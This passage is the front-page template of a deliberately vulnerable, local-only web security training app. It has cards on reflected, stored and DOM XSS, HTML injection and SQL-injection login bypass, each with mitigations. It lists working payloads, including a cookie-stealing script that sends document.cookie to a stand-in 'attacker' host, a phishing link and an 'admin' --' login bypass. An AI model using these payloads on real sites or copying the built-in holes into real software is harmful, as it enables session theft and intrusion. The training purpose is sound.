<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Security Playground — Intentionally Vulnerable App</title>
  <meta name="description" content="An intentionally vulnerable web security playground for local cybersecurity education and practice. Never deploy to production." />
  <meta name="robots" content="noindex, nofollow" />
  <link rel="stylesheet" href="/css/style.css" />
</head>
<body>

<!-- Toast container -->
<div class="toast-container" id="toast-container"></div>

<div class="app-layout">

  <!-- ─── Warning Banner ─────────────────────────────────────────────── -->
  <div class="warning-banner">
    ⚠️ INTENTIONALLY VULNERABLE APPLICATION — FOR LOCAL EDUCATIONAL USE ONLY — DO NOT EXPOSE TO THE INTERNET ⚠️
  </div>

  <!-- ─── Sidebar ────────────────────────────────────────────────────── -->
  <aside class="sidebar">
    <div class="sidebar-logo">
      <div class="logo-icon">🛡️</div>
      <div class="logo-title">Security Playground</div>
      <div class="logo-subtitle">Intentionally Vulnerable · Local Only</div>
    </div>

    <nav class="sidebar-nav">
      <div class="sidebar-section-title">Injection</div>
      <button class="nav-item" data-section="rxss-section">
        <span class="nav-icon">🪞</span> Reflected XSS
        <span class="nav-badge badge-high">HIGH</span>
      </button>
      <button class="nav-item" data-section="sxss-section">
        <span class="nav-icon">💾</span> Stored XSS
        <span class="nav-badge badge-high">HIGH</span>
      </button>
      <button class="nav-item" data-section="domxss-section">
        <span class="nav-icon">🌐</span> DOM XSS
        <span class="nav-badge badge-high">HIGH</span>
      </button>
      <button class="nav-item" data-section="sqli-section">
        <span class="nav-icon">🗃️</span> SQL Injection
        <span class="nav-badge badge-critical">CRIT</span>
      </button>
      <button class="nav-item" data-section="ssti-section">
        <span class="nav-icon">📝</span> SSTI
        <span class="nav-badge badge-critical">CRIT</span>
      </button>
      <button class="nav-item" data-section="rce-section">
        <span class="nav-icon">💻</span> Code Injection
        <span class="nav-badge badge-critical">CRIT</span>
      </button>

      <div class="sidebar-section-title">Server-Side</div>
      <button class="nav-item" data-section="ssrf-section">
        <span class="nav-icon">🌍</span> SSRF
        <span class="nav-badge badge-high">HIGH</span>
      </button>
      <button class="nav-item" data-section="proto-section">
        <span class="nav-icon">⛓️</span> Proto Pollution
        <span class="nav-badge badge-medium">MED</span>
      </button>
      <button class="nav-item" data-section="upload-section">
        <span class="nav-icon">📁</span> File Upload
        <span class="nav-badge badge-high">HIGH</span>
      </button>

      <div class="sidebar-section-title">Auth & Session</div>
      <button class="nav-item" data-section="sqli-section">
        <span class="nav-icon">🔑</span> Auth Bypass
        <span class="nav-badge badge-critical">CRIT</span>
      </button>
      <button class="nav-item" data-section="session-section">
        <span class="nav-icon">🍪</span> Session Hijack
        <span class="nav-badge badge-high">HIGH</span>
      </button>
      <button class="nav-item" data-section="cookie-section">
        <span class="nav-icon">🔍</span> Cookie Theft
        <span class="nav-badge badge-medium">MED</span>
      </button>
      <button class="nav-item" data-section="jwt-section">
        <span class="nav-icon">🎫</span> JWT Weaknesses
        <span class="nav-badge badge-high">HIGH</span>
      </button>

      <div class="sidebar-section-title">Access Control</div>
      <button class="nav-item" data-section="bac-section">
        <span class="nav-icon">🚪</span> Broken Access
        <span class="nav-badge badge-critical">CRIT</span>
      </button>
      <button class="nav-item" data-section="idor-section">
        <span class="nav-icon">👤</span> IDOR
        <span class="nav-badge badge-high">HIGH</span>
      </button>
      <button class="nav-item" data-section="csrf-section">
        <span class="nav-icon">🔄</span> CSRF
        <span class="nav-badge badge-medium">MED</span>
      </button>

      <button class="nav-item" data-section="htmlinj-section">
        <span class="nav-icon">📄</span> HTML Injection
        <span class="nav-badge badge-high">HIGH</span>
      </button>

      <div class="sidebar-section-title">Client-Side</div>
      <button class="nav-item" data-section="redirect-section">
        <span class="nav-icon">🔗</span> Open Redirect
        <span class="nav-badge badge-medium">MED</span>
      </button>
      <button class="nav-item" data-section="clickjack-section">
        <span class="nav-icon">🖼️</span> Clickjacking
        <span class="nav-badge badge-medium">MED</span>
      </button>
      <button class="nav-item" data-section="storage-section">
        <span class="nav-icon">💽</span> Storage & Cookies
        <span class="nav-badge badge-low">LOW</span>
      </button>
      <button class="nav-item" data-section="ratelimit-section">
        <span class="nav-icon">🏃</span> Rate Limiting
        <span class="nav-badge badge-medium">MED</span>
      </button>

      <div class="sidebar-section-title">Discovery</div>
      <button class="nav-item" data-section="info-section">
        <span class="nav-icon">ℹ️</span> Info Disclosure
        <span class="nav-badge badge-medium">MED</span>
      </button>
      <button class="nav-item" data-section="apidisc-section">
        <span class="nav-icon">🗺️</span> API Discovery
        <span class="nav-badge badge-low">LOW</span>
      </button>
    </nav>

    <div class="sidebar-footer">
      <% if (username) { %>
        👤 <strong><%= username %></strong> (<%= role %>)<br>
      <% } else { %>
        🔓 Not logged in<br>
      <% } %>
      Port: <%= port %> · SQLite · Node.js
    </div>
  </aside>

  <!-- ─── Main Content ────────────────────────────────────────────────── -->
  <main class="main-content">

    <!-- Page Header -->
    <div class="page-header">
      <h1 class="page-title">🛡️ Web Security Playground</h1>
      <p class="page-subtitle">Intentionally vulnerable application for cybersecurity education — localhost only</p>
      <div class="header-stats">
        <div class="stat-chip">
          <span style="color:var(--critical)">🔴</span>
          <span class="stat-num" style="color:var(--critical)">6</span>
          <span>Critical</span>
        </div>
        <div class="stat-chip">
          <span style="color:var(--high)">🟠</span>
          <span class="stat-num" style="color:var(--high)">8</span>
          <span>High</span>
        </div>
        <div class="stat-chip">
          <span style="color:var(--medium)">🟡</span>
          <span class="stat-num" style="color:var(--medium)">6</span>
          <span>Medium</span>
        </div>
        <div class="stat-chip">
          <span style="color:var(--low)">🟢</span>
          <span class="stat-num" style="color:var(--low)">4</span>
          <span>Low</span>
        </div>
        <div class="stat-chip" style="cursor:pointer" onclick="fetchApiList(); document.getElementById('apidisc-section').scrollIntoView({behavior:'smooth'})">
          <span>📡</span>
          <span class="stat-num">30+</span>
          <span>Endpoints</span>
        </div>
      </div>
    </div>

    <!-- ══════════════════════════════════════════════════════════════════
         SECTION: XSS
    ══════════════════════════════════════════════════════════════════════ -->
    <section class="section" id="rxss-section">
      <div class="section-title">
        <div class="section-title-icon icon-red">🪞</div>
        Cross-Site Scripting (XSS)
      </div>
      <div class="cards-grid">

        <!-- Reflected XSS -->
        <div class="vuln-card">
          <div class="card-header">
            <div class="card-icon icon-red">🪞</div>
            <div class="card-header-info">
              <div class="card-title">Reflected XSS</div>
              <div class="card-meta">
                <span class="owasp-tag">OWASP A03:2021</span>
                <span class="risk-badge risk-high">HIGH</span>
                <span class="owasp-tag">CWE-79</span>
              </div>
            </div>
          </div>
          <div class="card-body">
            <p class="card-description">
              User-supplied input from the URL query string is reflected back in the HTTP response
              without sanitization. The server includes the raw input in the search results page,
              allowing JavaScript injection.
            </p>

            <button class="expand-toggle" data-target="rxss-details">
              <span class="arrow">▶</span> Attack Surface & Payloads
            </button>
            <div class="expand-content" id="rxss-details">
              <div class="info-row"><span class="info-label">Attack Surface</span><span class="info-value">GET /search?q= parameter</span></div>
              <div class="info-row"><span class="info-label">Sink</span><span class="info-value">innerHTML / server-side reflection</span></div>
              <div class="info-row"><span class="info-label">Impact</span><span class="info-value">Cookie theft, session hijacking, phishing</span></div>
              <p style="font-size:11px;color:var(--text-muted);margin:8px 0 4px">Example payloads (click to load):</p>
              <ul class="payload-list">
                <li class="payload-item">
                  <span class="payload-code" data-target="rxss-input">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
                  <button class="copy-btn" title="Copy">📋</button>
                </li>
                <li class="payload-item">
                  <span class="payload-code" data-target="rxss-input">&lt;img src=x onerror=alert(document.domain)&gt;</span>
                  <button class="copy-btn" title="Copy">📋</button>
                </li>
                <li class="payload-item">
                  <span class="payload-code" data-target="rxss-input">&lt;svg onload=alert(1)&gt;</span>
                  <button class="copy-btn" title="Copy">📋</button>
                </li>
                <li class="payload-item">
                  <span class="payload-code" data-target="rxss-input">"&gt;&lt;script&gt;fetch('http://attacker/?c='+document.cookie)&lt;/script&gt;</span>
                  <button class="copy-btn" title="Copy">📋</button>
                </li>
              </ul>
              <div class="mitigation-panel">
                <div class="mitigation-title">✅ Mitigations</div>
                <ul class="mitigation-list">
                  <li>Use textContent instead of innerHTML</li>
                  <li>Encode output: htmlspecialchars() / DOMPurify</li>
                  <li>Implement Content-Security-Policy header</li>
                  <li>Validate and sanitize all inputs server-side</li>
                </ul>
              </div>
            </div>
          </div>
          <div class="card-try">
            <div class="try-label">🧪 Try It</div>
            <div class="form-group">
              <label class="form-label">Search Query (reflected without sanitization)</label>
              <input class="form-input" id="rxss-input" placeholder="Enter search or XSS payload..." value="Juice" />
            </div>
            <div class="btn-row">
              <button class="btn btn-primary" onclick="doReflectedSearch()">🔍 Search</button>
              <button class="btn btn-ghost btn-sm" onclick="setInputValue('rxss-input','&lt;script&gt;alert(1)&lt;/script&gt;')">Load XSS</button>
              <button class="btn btn-ghost btn-sm" onclick="setInputValue('rxss-input',&quot;&lt;img src=x onerror=alert('XSS!')&gt;&quot;)">Load onerror</button>
            </div>
            <div id="rxss-results-wrap" style="display:none;margin-top:10px">
              <div class="search-results" id="rxss-results"></div>
            </div>
            <div class="response-viewer" id="rxss-response">
              <div class="response-tabs">
                <button class="response-tab active">Response</button>
              </div>
              <div class="response-status">
                <span>Status:</span><span class="response-status-text status-200">—</span>
              </div>
              <div class="response-body"></div>
            </div>
          </div>
        </div>

        <!-- Stored XSS -->
        <div class="vuln-card" id="sxss-section">
          <div class="card-header">
            <div class="card-icon icon-red">💾</div>
            <div class="card-header-info">
              <div class="card-title">Stored XSS</div>
              <div class="card-meta">
                <span class="owasp-tag">OWASP A03:2021</span>
                <span class="risk-badge risk-high">HIGH</span>
                <span class="owasp-tag">CWE-79</span>
              </div>
            </div>
          </div>
          <div class="card-body">
            <p class="card-description">
              Comments are stored in SQLite without sanitization and rendered directly via
              <code>innerHTML</code> on page load. Any user visiting the page executes the stored payload.
            </p>
            <button class="expand-toggle" data-target="sxss-details">
              <span class="arrow">▶</span> Attack Surface & Payloads
            </button>
            <div class="expand-content" id="sxss-details">
              <div class="info-row"><span class="info-label">Attack Surface</span><span class="info-value">POST /comment body → GET /comments render</span></div>
              <div class="info-row"><span class="info-label">Sink</span><span class="info-value">element.innerHTML = raw DB content</span></div>
              <ul class="payload-list">
                <li class="payload-item">
                  <span class="payload-code" data-target="comment-content">&lt;script&gt;alert('Stored XSS!')&lt;/script&gt;</span>
                  <button class="copy-btn">📋</button>
                </li>
                <li class="payload-item">
                  <span class="payload-code" data-target="comment-content">&lt;img src=x onerror="alert(document.cookie)"&gt;</span>
                  <button class="copy-btn">📋</button>
                </li>
                <li class="payload-item">
                  <span class="payload-code" data-target="comment-content">&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</span>
                  <button class="copy-btn">📋</button>
                </li>
              </ul>
              <div class="mitigation-panel">
                <div class="mitigation-title">✅ Mitigations</div>
                <ul class="mitigation-list">
                  <li>Sanitize on input (DOMPurify server-side)</li>
                  <li>Encode on output (escape HTML entities)</li>
                  <li>Use textContent instead of innerHTML</li>
                  <li>Content-Security-Policy: script-src 'self'</li>
                </ul>
              </div>
            </div>
            <div class="comments-feed" id="comments-feed">
              <div class="comment-item" style="color:var(--text-muted)">Loading comments...</div>
            </div>
          </div>
          <div class="card-try">
            <div class="try-label">🧪 Try It</div>
            <div class="form-row">
              <div class="form-group">
                <label class="form-label">Author</label>
                <input class="form-input" id="comment-author" placeholder="Your name" value="hacker" />
              </div>
              <div class="form-group">
                <label class="form-label">&nbsp;</label>
                <button class="btn btn-ghost btn-sm" onclick="clearComments()" style="width:100%;margin-top:5px">🗑 Clear All</button>
              </div>
            </div>
            <div class="form-group">
              <label class="form-label">Comment (stored raw in SQLite)</label>
              <textarea class="form-textarea" id="comment-content" placeholder="Enter comment or XSS payload..."></textarea>
            </div>
            <div class="btn-row">
              <button class="btn btn-primary" onclick="postComment()">💬 Post Comment</button>
              <button class="btn btn-ghost btn-sm" onclick="loadComments()">🔄 Refresh</button>
            </div>
            <div class="response-viewer" id="sxss-response">
              <div class="response-tabs"><button class="response-tab active">Response</button></div>
              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
              <div class="response-body"></div>
            </div>
          </div>
        </div>

        <!-- DOM XSS -->
        <div class="vuln-card" id="domxss-section">
          <div class="card-header">
            <div class="card-icon icon-orange">🌐</div>
            <div class="card-header-info">
              <div class="card-title">DOM-Based XSS</div>
              <div class="card-meta">
                <span class="owasp-tag">OWASP A03:2021</span>
                <span class="risk-badge risk-high">HIGH</span>
                <span class="owasp-tag">CWE-79</span>
              </div>
            </div>
          </div>
          <div class="card-body">
            <p class="card-description">
              JavaScript reads from <code>location.hash</code> or <code>URLSearchParams</code>
              and inserts the value directly into the DOM via <code>innerHTML</code> — no server involved.
              Payload: <code>http://localhost:3000/#&lt;img src=x onerror=alert(1)&gt;</code>
            </p>
            <button class="expand-toggle" data-target="domxss-details">
              <span class="arrow">▶</span> Attack Surface & Payloads
            </button>
            <div class="expand-content" id="domxss-details">
              <div class="info-row"><span class="info-label">Source</span><span class="info-value">location.hash, URLSearchParams</span></div>
              <div class="info-row"><span class="info-label">Sink</span><span class="info-value">element.innerHTML = value</span></div>
              <div class="info-row"><span class="info-label">No server</span><span class="info-value">Purely client-side — not visible in server logs</span></div>
              <ul class="payload-list">
                <li class="payload-item">
                  <span class="payload-code" data-target="dom-xss-input">&lt;img src=x onerror=alert(1)&gt;</span>
                  <button class="copy-btn">📋</button>
                </li>
                <li class="payload-item">
                  <span class="payload-code" data-target="dom-xss-input">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
                  <button class="copy-btn">📋</button>
                </li>
                <li class="payload-item">
                  <span class="payload-code" data-target="dom-xss-input">&lt;svg/onload=alert('DOM XSS')&gt;</span>
                  <button class="copy-btn">📋</button>
                </li>
              </ul>
              <div class="mitigation-panel">
                <div class="mitigation-title">✅ Mitigations</div>
                <ul class="mitigation-list">
                  <li>Use textContent / createTextNode instead of innerHTML</li>
                  <li>Sanitize with DOMPurify before DOM insertion</li>
                  <li>Avoid reading from URL fragments directly into DOM sinks</li>
                </ul>
              </div>
            </div>
            <div style="padding:12px;background:rgba(255,107,53,0.06);border:1px solid rgba(255,107,53,0.2);border-radius:8px;font-size:12px;color:var(--text-secondary);margin-top:8px">
              <strong style="color:var(--high)">DOM Output:</strong>
              <div id="dom-xss-output" style="margin-top:6px;color:var(--text-primary)">
                (output will appear here — innerHTML sink)
              </div>
            </div>
          </div>
          <div class="card-try">
            <div class="try-label">🧪 Try It</div>
            <div class="form-group">
              <label class="form-label">Payload (set via location.hash)</label>
              <input class="form-input" id="dom-xss-input" placeholder="Enter DOM XSS payload..." />
            </div>
            <div class="btn-row">
              <button class="btn btn-primary" onclick="triggerDomXSS()">⚡ Inject DOM</button>
              <button class="btn btn-ghost btn-sm" onclick="setInputValue('dom-xss-input','&lt;img src=x onerror=alert(1)&gt;')">Load payload</button>
            </div>
            <div class="response-viewer" id="domxss-response">
              <div class="response-tabs"><button class="response-tab active">Info</button></div>
              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
              <div class="response-body"></div>
            </div>
          </div>
        </div>

        <!-- HTML Injection -->
        <div class="vuln-card" id="html-injection-section">
          <div class="card-header">
            <div class="card-icon icon-orange">📄</div>
            <div class="card-header-info">
              <div class="card-title">HTML Injection</div>
              <div class="card-meta">
                <span class="owasp-tag">OWASP A03:2021</span>
                <span class="risk-badge risk-high">HIGH</span>
                <span class="owasp-tag">CWE-79</span>
              </div>
            </div>
          </div>
          <div class="card-body">
            <p class="card-description">
              Type an HTML payload below and see it render live on this dashboard. This simulates a reflected HTML injection without navigating away.
            </p>
            <div style="padding:12px;background:rgba(255,107,53,0.06);border:1px solid rgba(255,107,53,0.2);border-radius:8px;font-size:12px;color:var(--text-secondary);margin-top:8px">
              <strong style="color:var(--high)">Rendered HTML Output (innerHTML sink):</strong>
              <div id="html-inj-output" style="margin-top:6px;color:var(--text-primary);min-height:20px;">
                (Injected HTML will appear here)
              </div>
            </div>
          </div>
          <div class="card-try">
            <div class="try-label">🧪 Try It</div>
            <div class="form-group">
              <label class="form-label">HTML Payload (inserted directly into the DOM)</label>
              <textarea class="form-textarea" id="html-inj-input" placeholder="<h1>Test</h1>"></textarea>
            </div>
            <div class="btn-row">
              <button class="btn btn-primary" onclick="triggerHtmlInjection()">Inject HTML</button>
              <button class="btn btn-ghost btn-sm" onclick="setInputValue('html-inj-input','<h1>Hello <span style=\'color:red\'>World</span>!</h1>')">Load HTML</button>
              <button class="btn btn-ghost btn-sm" onclick="setInputValue('html-inj-input','<a href=\'http://attacker.com\'>Click to win a prize!</a>')">Load Phish</button>
              <a href="/html-injection.html?q=%3Ch1%3EHello%3C/h1%3E" target="_blank" class="btn btn-ghost btn-sm" style="text-decoration:none; text-align:center;">
                🔗 Open Standalone Page
              </a>
            </div>
          </div>
        </div>

      </div>
    </section>

    <div class="divider"></div>

    <!-- ══════════════════════════════════════════════════════════════════
         SECTION: SQL INJECTION
    ══════════════════════════════════════════════════════════════════════ -->
    <section class="section" id="sqli-section">
      <div class="section-title">
        <div class="section-title-icon icon-red">🗃️</div>
        SQL Injection & Authentication Bypass
      </div>
      <div class="cards-grid">

        <!-- SQLi Login -->
        <div class="vuln-card">
          <div class="card-header">
            <div class="card-icon icon-red">🗃️</div>
            <div class="card-header-info">
              <div class="card-title">SQL Injection — Login</div>
              <div class="card-meta">
                <span class="owasp-tag">OWASP A03:2021</span>
                <span class="risk-badge risk-critical">CRITICAL</span>
                <span class="owasp-tag">CWE-89</span>
              </div>
            </div>
          </div>
          <div class="card-body">
            <p class="card-description">
              Login query is built via string concatenation: <br>
              <code style="font-family:monospace;font-size:11px;color:var(--accent-teal)">SELECT * FROM users WHERE username='INPUT' AND password='INPUT'</code><br>
              Allows authentication bypass, data extraction via UNION, and error-based injection.
            </p>
            <button class="expand-toggle" data-target="sqli-details">
              <span class="arrow">▶</span> Payloads & Techniques
            </button>
            <div class="expand-content" id="sqli-details">
              <div class="info-row"><span class="info-label">DB Engine</span><span class="info-value">SQLite</span></div>
              <div class="info-row"><span class="info-label">Endpoint</span><span class="info-value">POST /login</span></div>
              <p style="font-size:11px;color:var(--text-muted);margin:8px 0 4px">Auth Bypass payloads (username field):</p>
              <ul class="payload-list">
                <li class="payload-item">
                  <span class="payload-code" data-target="sql-username">admin' --</span>
                  <button class="copy-btn">📋</button>
                </li>
                <li class="payload-item">
